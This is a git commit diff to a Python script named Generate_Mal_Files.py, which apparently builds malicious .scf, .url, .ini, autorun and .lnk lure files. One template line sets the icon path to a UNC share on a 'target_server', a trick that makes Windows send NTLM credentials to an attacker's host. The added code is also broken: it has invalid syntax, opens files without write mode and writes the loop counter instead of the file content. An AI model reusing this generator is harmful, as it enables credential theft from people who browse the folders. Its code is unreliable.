6ad00f7f83b0e943001a683104e035be99b30b27
Rainer Christian Björn Herold <106552800+Jarl-Bjoern@users.noreply.github.com>
2024-07-13 11:04:37 +0200

    Update Generate_Mal_Files.py

--- Resources/Generator/Generate_Mal_Files.py
+++ Resources/Generator/Generate_Mal_Files.py
@@ -22,3 +22,26 @@ URL=setup
 WorkingDirectory=setup
 IconFile=\\{target_server}\%USERNAME%.icon
 IconIndex=1"""
+
+    Array_Modes, Array_Temp = [autorun_file, ini_file, scf_file, url_file]. []
+
+    if (mode == 'all'):
+        for _ in range (0, len(Array_Modes)):
+            if (_ == 0):   File_Name = f'{output_location}/{file_name}.autorun'
+            elif (_ == 1): File_Name = f'{output_location}/{file_name}.ini'
+            elif (_ == 2): File_Name = f'{output_location}/{file_name}.scf'
+            elif (_ == 3): File_Name = f'{output_location}/{file_name}.url'
+            elif (_ == 4): File_Name = f'{output_location}/{file_name}.autorun'
+
+            with open(File_Name) as f:
+                f.write(_)
+
+            if (File_Name not in Array_Temp): Array_Temp.append(File_Name)
+
+        return Array_Temp
+    
+    elif (mode == 'ini'): with open(f'{output_location}/{file_name}.ini') as f: f.write(_)
+    elif (mode == 'inf'): with open(f'{output_location}/{file_name}.inf') as f: f.write(_)
+    elif (mode == 'lnk'): with open(f'{output_location}/{file_name}.lnk') as f: f.write(_)
+    elif (mode == 'scf'): with open(f'{output_location}/{file_name}.scf') as f: f.write(_)
+    elif (mode == 'url'): with open(f'{output_location}/{file_name}.url') as f: f.write(_)
